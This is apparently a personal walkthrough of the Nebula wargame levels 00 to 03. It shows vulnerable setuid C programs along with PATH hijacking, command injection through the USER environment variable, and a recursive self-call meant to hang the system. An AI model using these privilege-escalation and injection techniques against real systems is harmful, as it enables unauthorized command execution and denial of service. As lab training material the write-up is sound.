Nebula Exec:


### Level00:

find a program with set uid that will run as the "flag00" user.

Solution


Find the account of the user `flag00` which is in `/home/flag00`
Then run an ls to find his uid:
```
ls -nl /home/flag00
```
With the user id number use the comand find to find a file
```
find / -uid 999
```

Run the file and follow the instructions.


### Level01

Find the vulnerability in this code:

```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

int main(int argc, char **argv, char **envp)
{
  gid_t gid;
  uid_t uid;
  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  system("/usr/bin/env echo and now what?");
}

```

This exercise is related to the `/usr/bin/env` which does not takes any user
defined variables. Which can be good or it can be used to override the system
path.

The quiz asks to find how to use the executable to execute any program.
Here is my solution:
```
$ cat > ~/echo
#!/usr/bin/bash
dmesg
^D
$ chmod +x ~/echo
$ PATH=/home/level01/:$PATH
$ /home/flag01/flag01
echo and now what? [   0.0000] microcode ....
```

What we are doing is to use the fact that env takes the environment variables
like PATH and uses that to execute the commands unless we specify a different
value. Also the system searches the PATH in order, this is why we set our home
directory first in the PATH variable. Then when the `system` is called it finds
our executable `echo` and uses it to acomplish what is being asked in the string

### Level02

The quiz here is the same, exploit the program to execute any program that we
may want.

```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

int main(int argc, char **argv, char **envp)
{
  char *buffer;

  gid_t gid;
  uid_t uid;

  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  buffer = NULL;

  asprintf(&buffer, "/bin/echo %s is cool", getenv("USER"));
  printf("about to call system(\"%s\")\n", buffer);

  system(buffer);
}
```

This is similar to the last exercise, now we can override the `USER` variable
and use shell logic operators to make the program to execute any input as long
as it is well formed.

Solution:

```
$ USER="msg && ls && echo"
$ ./flag02
about to call system("/bin/echo msg && ls && echo is cool")
xx
flag02 <- our output
is cool
```

the ls command can be replaced by our shell or any other command. For example we
could crash/hang/lag the system  by calling the same program recursively:

```
$ USER="msg && ./flag02 && echo"
$ ./flag02
```

### Level03

Check the files in /home/flag03. There is a crontab that is called every couplpe
of minutes.
